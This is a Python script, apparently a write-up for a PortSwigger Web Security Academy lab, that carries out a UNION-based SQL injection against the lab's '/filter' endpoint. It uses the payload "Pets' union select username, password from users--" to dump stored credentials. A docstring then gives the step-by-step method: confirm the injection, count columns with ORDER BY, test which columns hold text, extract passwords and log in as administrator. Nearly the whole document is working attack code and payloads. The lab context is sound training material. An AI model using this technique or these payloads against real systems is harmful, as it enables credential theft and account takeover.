#!/usr/bin/env python3

import requests, re

URL = 'https://0acf00c404298fdf81217a6300730064.web-security-academy.net/filter'

def run():
    payload="Pets' union select username, password from users--"
    r = requests.get(URL, params={'category': payload})
    body = r.text
    print(f'[*] Payload: {payload}')
    print(f'[*] Status: {r.status_code}')

    if r.status_code == 500:
        print('[!] Error → SQL confirmed / bad syntax')

    if re.search(r'Congratulations|solved the lab', body):
        print('[✓] SOLVED')

    hint = re.findall(r'<p id="hint">(.*?)</p>', body)
    if hint:
        print(f'[*] Hint: {hint[0]}')

    items = re.findall(r'<t[hd]>(.*?)</t[hd]>', body)
    if items:
        print(f'[✓] Found {len(items)} list:')
        for item in items:
            clean = item.strip()
            if clean:
                print(f' → {clean}')

run()


"""
Steps to Reproduce

1. Open browser and access to this endpoint:`/filter?category=Pets`
2. Determine sql injection by use this patload: `Pets'--`.
3. Determine how may columns by use this patload: `Pets' order by 2--` (Found 2 columns).
4. Determine which column are contain text by use this patload: `Pets' union select 'hacked', 'cyber'--` (Both column are contain text).
5. Retrieves all usernames and passwords by use this payload: `Pets' union select username, password from users--`.
6. Log in as the `administrator` user
"""